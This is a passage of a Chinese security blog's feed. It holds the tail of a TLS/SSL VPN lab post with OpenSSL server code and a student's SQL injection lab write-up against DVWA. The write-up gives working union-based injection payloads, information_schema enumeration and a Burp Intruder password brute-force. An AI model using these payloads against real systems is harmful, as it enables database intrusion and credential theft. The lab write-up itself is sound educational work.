class="hljs-keyword">int</span> tunfd)</span> </span>&#123;    <span class="hljs-comment">//该函数的作用是将来自客户端的程序发给了</span><span class="hljs-keyword">int</span> len;<span class="hljs-keyword">char</span> buff[BUFF_SIZE];<span class="hljs-keyword">char</span> *ptr = buff;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Got a packet from the tunnel established \n"</span>);    bzero(buff, BUFF_SIZE);len = SSL_read(ssl, buff, BUFF_SIZE);buff[len] = <span class="hljs-string">'\0'</span>;<span class="hljs-built_in">write</span>(tunfd, buff, len);&#125;</code></pre><p>对于<code>main()</code>函数的修改</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;SSL_METHOD *meth;SSL_CTX* ctx;SSL *ssl;<span class="hljs-keyword">int</span> err;    <span class="hljs-comment">// Step 0: OpenSSL library initialization</span><span class="hljs-comment">// This step is no longer needed as of version 1.1.0.</span>SSL_library_init();SSL_load_error_strings();SSLeay_add_ssl_algorithms();    <span class="hljs-comment">// Step 1: SSL context initialization</span>meth = (SSL_METHOD *)TLSv1_2_method();ctx = SSL_CTX_new(meth);SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, <span class="hljs-literal">NULL</span>);    <span class="hljs-comment">// Step 2: Set up the server certificate and private key</span>SSL_CTX_use_certificate_file(ctx, <span class="hljs-string">"./cert_server/server-cert.pem"</span>,SSL_FILETYPE_PEM);SSL_CTX_use_PrivateKey_file(ctx, <span class="hljs-string">"./cert_server/server-key.pem"</span>,SSL_FILETYPE_PEM);    <span class="hljs-comment">// Step 3: Create a new SSL structure for a connection</span>ssl = SSL_new (ctx);<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sa_client</span>;</span><span class="hljs-keyword">size_t</span> client_len;<span class="hljs-keyword">int</span> tunfd = createTunDevice();<span class="hljs-keyword">int</span> listen_sock = setupTCPServer();    <span class="hljs-keyword">int</span> fd[<span class="hljs-number">2</span>];<span class="hljs-comment">//pipe输入端和pipe输出端</span><span class="hljs-keyword">pid_t</span> pid;    pipe(fd);pid = fork();<span class="hljs-comment">//fork子进程，pid为子进程id</span><span class="hljs-keyword">if</span>(pid==<span class="hljs-number">-1</span>)&#123;perror(<span class="hljs-string">"fork"</span>);<span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);&#125;<span class="hljs-keyword">if</span>(pid&gt;<span class="hljs-number">0</span>)&#123;<span class="hljs-built_in">close</span>(fd[<span class="hljs-number">0</span>]);<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;fd_set readFDSet;FD_ZERO(&amp;readFDSet);FD_SET(tunfd, &amp;readFDSet);select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<span class="hljs-keyword">if</span> (FD_ISSET(tunfd, &amp;readFDSet)) tunPipeSelected(tunfd, fd[<span class="hljs-number">1</span>]);&#125;<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-built_in">close</span>(fd[<span class="hljs-number">1</span>]);<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<span class="hljs-keyword">int</span> sock = accept(listen_sock, (struct sockaddr*)&amp;sa_client, &amp;client_len);<span class="hljs-keyword">if</span> (fork() == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// The child process</span><span class="hljs-built_in">close</span> (listen_sock);            SSL_set_fd (ssl, sock);<span class="hljs-keyword">int</span> err = SSL_accept (ssl);CHK_SSL(err);<span class="hljs-built_in">printf</span> (<span class="hljs-string">"SSL connection established in child process!\n"</span>);loginRequest(ssl,sock);processRequest(ssl, sock);<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;fd_set readFDSet;                FD_ZERO(&amp;readFDSet);FD_SET(sock, &amp;readFDSet);FD_SET(fd[<span class="hljs-number">0</span>], &amp;readFDSet);                select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<span class="hljs-keyword">if</span> (FD_ISSET(fd[<span class="hljs-number">0</span>],&amp;readFDSet)) pipeSelected(fd[<span class="hljs-number">0</span>], sock, ssl);<span class="hljs-keyword">if</span> (FD_ISSET(sock, &amp;readFDSet)) socketSelected(fd[<span class="hljs-number">0</span>],sock,ssl,tunfd);&#125;&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// The parent process</span><span class="hljs-built_in">close</span>(sock);&#125;&#125;&#125;&#125;</code></pre><p>并且此时并不需要在单线程的时候所写的<code>socketSelecct()</code>和<code>tunSelect()</code>，</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;TLS-SSL-VPN设计基础&quot;&gt;&lt;a href=&quot;#TLS-SSL-VPN设计基础&quot; class=&quot;headerlink&quot; title=&quot;TLS/SSL VPN设计基础&quot;&gt;&lt;/a&gt;TLS/SSL VPN设计基础&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;VPN&lt;/li&gt;
&lt;li</summary>
      
    
    
    
    
    <category term="Network Security" scheme="http://yoursite.com/tags/Network-Security/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入实验</title>
    <link href="http://yoursite.com/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/"/>
    <id>http://yoursite.com/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/</id>
    <published>2020-12-19T14:58:10.000Z</published>
    <updated>2020-12-20T14:26:22.907Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实验基本原理-amp-目的"><a href="#实验基本原理-amp-目的" class="headerlink" title="实验基本原理&amp;目的"></a>实验基本原理&amp;目的</h2><blockquote><p>Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。</p></blockquote><p>参考blog：<a href="https://www.jianshu.com/p/078df7a35671" target="_blank" rel="noopener">SQL注入基本原理</a></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="猜解数据库"><a href="#猜解数据库" class="headerlink" title="猜解数据库"></a>猜解数据库</h3><p><strong>Step1：理解PHP页面通过get方法传递参数</strong></p><p>当我们的sercurity level为low的时候，分析网页的html源码会发现是php的参数通过get方法来进行获取的</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p><p>而当时medium的时候，是通过POST来获取的，用户不再输入，而是仅能通过选择来进行</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-3.PNG" srcset="/img/loading.gif" alt="1-3"></p><p><strong>Step 2：查看source code</strong></p><p>当安全级别为medium的时候，我们可以看到source code中的SQL查询语句为</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><p>那么当我们输入id（例如：1）之后，所构造的SQL的完整语句就是</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span>;</code></pre><p>意思是在名为<code>users</code>的表中找到<code>user_id</code>这个列中内容为<code>&quot;1&quot;</code>的那一条数据的<code>first_name</code>以及<code>last_name</code>的值</p><p>所以之后我们可以通过控制输入的参数id的值来调整执行的SQL语句</p><p><strong>Step 3：猜解SQL查询语句当中的字段数</strong></p><ul><li>（可能是在这里有输入的提示才不进行SQL注入类型的判断，但是正常情况下要实现判断注入的类型时字符型还是数字型）</li></ul><p>在这里通过<code>Burp Suit</code>输入<code>1&#39; order by 1#</code>，此时php所要执行的SQL语句就变为了</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span><span class="hljs-comment">#';</span></code></pre><p>此时SQL会把#后面内容屏蔽来避免语句错误，但是此时会发现提示语法错误</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-6.PNG" srcset="/img/loading.gif" alt="1-6"></p><p>在这里，根据参考<a href="https://yq.aliyun.com/articles/473535" target="_blank" rel="noopener">渗透学习笔记–基础篇–sql注入（数字型）</a>会发现是由于’ 被转义为了\，之后注入的时候只需要输入<code>1 order by 1#</code>即可</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-4.PNG" srcset="/img/loading.gif" alt="1-4"></p><p>结果为</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-7.PNG" srcset="/img/loading.gif" alt="1-7"></p><p>同时测试<code>1 order by 2#</code>，发现也成功，但是到了order by 3#的时候，会发现出现错误，说明这个名为<code>users</code>的表应该是2列</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-8.PNG" srcset="/img/loading.gif" alt="1-8"></p><p><strong>Step 4：获取数据库名等信息</strong></p><p>在这里，我们构造<code>1 union select database(),user()</code></p><ul><li><code>database()</code>会返回当前网站所使用的数据库的名字</li><li><code>user()</code>会返回执行当前查询的用户的名字</li></ul><p>此时，SQL<strong>实际执行</strong>的语句应该为</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span><span class="hljs-keyword">union</span><span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),<span class="hljs-keyword">user</span>()<span class="hljs-comment">#;</span></code></pre><p>意思为，首先在user这个表中找到user_id 为1的first_name和last name两列，之后再<code>select database(), user()</code>，最后将两个select出的表格合并，之后返回html页面，如图显示，所以数据库名为<code>dvwa</code>，执行当前查询的用户的名字为<code>root@localhost</code></p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-9.PNG" srcset="/img/loading.gif" alt="1-9"></p><p> <strong>Step 5：获取数据库版本以及操作系统信息</strong></p><p>在这里，我们输入的是<code>1 union select version(),@@version_compile_os#</code></p><ul><li><code>version()</code>获取当前数据库的版本信息</li><li><code>@@version_compile_os</code>获取当前操作系统信息</li></ul><p>此时，实际执行的SQL语句为</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">version</span>(),@@version_compile_os<span class="hljs-comment">#;</span></code></pre><p>具体的意思可结合上面step和函数作用了解，执行结果为下图，我们可以了解当前数据库版本为<code>5.5.53</code>，操作系统为<code>win32</code></p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><p><strong>Step 6：获取数据库中的表名</strong></p><blockquote><p><code>information_schema</code> 是 mysql 自带的一张表，这张数据表保存了 Mysql 服务器所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限等。该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库</p></blockquote><p>我们输入的内容为 <code>1&#39; union select table_name,table_schema from information_schema.tables where table_schema= &#39;dvwa&#39;#</code>，但是由于存在转义字符，所以可以采用16进制来写dvwa或者<code>database()</code>来代替，实际所执行的SQL语句为</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span> <span class="hljs-keyword">union</span><span class="hljs-keyword">select</span> table_name,table_schema <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema= <span class="hljs-string">'dvwa'</span><span class="hljs-comment">#;</span></code></pre><p>结果如下</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><p>所以此时我们可以得到<code>dvwa</code>这个数据库下面有两个表，分别名为<code>guestbook</code>和<code>users</code></p><h3 id="验证绕过，级别为medium"><a href="#验证绕过，级别为medium" class="headerlink" title="验证绕过，级别为medium"></a>验证绕过，级别为medium</h3><p>首先来看能够正确验证，我们在<code>user</code>和<code>password</code>直接输入123，会发现提示此时账户/密码不正确</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/2-3.PNG" srcset="/img/loading.gif" alt="2-3"></p><p>之后来看后台的php代码的具体运行情况，发现比较重要的是SQL的select语句以及后面呢条件判断，而当我们输入123的时候，实际执行的SQL语句为</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">'123'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">'123'</span></code></pre><p>在这里好像有转义字符的限制，我们通过将捕获的包<code>Intruder</code>模块来实现，可以用暴力破解来实现，可以看到password的字段长度和其他的明显不一样（因为返回的正确信息的长度和错误信息的长度不一样），所以密码可能就是<code>password</code>，试验后发现成功login</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/2-6.PNG" srcset="/img/loading.gif" alt="2-6"></p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/2-7.PNG" srcset="/img/loading.gif" alt="2-7"></p><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>4.1 判断是否存在注入漏洞</strong></p><p>一般我们进行判断的时候，在输入的参数后面加一个单引号，比如</p><pre><code class="hljs sql">http://xxx/abc.php?id=1'</code></pre><p>当页面返回错误的时候，说明是存在SQL注入的，因为无论字符型还是整型都会因为单引号个数不匹配而报错（比如在安全级别为low的时候，当我们输入1’的时候，会报语法错误）。</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p>而如果未报错，不代表不存在 Sql 注入，因为有可能页面对单引号做了过滤/转义，这时可以使用判断语句进行注入（比如在安全级别为medium的时候进行了转义）</p><p>*<em>4.2 判断注入类型是字符型还是数字型 *</em></p><p>当输入<code>and 1=1</code>，此时执行的SQL语句就是</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = x <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span></code></pre><p>如果此时成功，试验<code>and 1=2</code></p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = x <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span></code></pre><p>如果此时失败，则综合上面的，说明类型为数字型，因为如果注入类型为字符型，就会出现，此时并没有执行and语句后面的判断，所以不会出现上面一正一负的结果</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'x and 1=1'</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'x and 1=2'</span></code></pre><p>而当注入类型为字符型的时候，一般SQL语句为</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'x'</span></code></pre><p>此时通过 <code>and &#39;1&#39;=&#39;1</code> 和 <code>and &#39;1&#39;=&#39;2</code>来判断，因为此时的执行的SQL语句为（一正一负的结果）</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'x'</span> <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1'</span><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'x'</span> <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'2'</span></code></pre><p>如果假设为数字型，则会变为下面的SQL语句，此时都会是语法错误</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = x <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1</span><span class="hljs-string">select * from &lt;表名&gt; where id = x and '</span><span class="hljs-number">1</span><span class="hljs-string">'='</span><span class="hljs-number">2</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;实验基本原理-amp-目的&quot;&gt;&lt;a href=&quot;#实验基本原理-amp-目的&quot; class=&quot;headerlink&quot; title=&quot;实验基本原理&amp;amp;目的&quot;&gt;&lt;/a&gt;实验基本原理&amp;amp;目的&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Sql 注入攻击是通过将恶</summary>
      
    
    
    
    
    <category term="Information System Securit" scheme="http://yoursite.com/tags/Information-System-Securit/"/>
    
  </entry>
  
</feed>
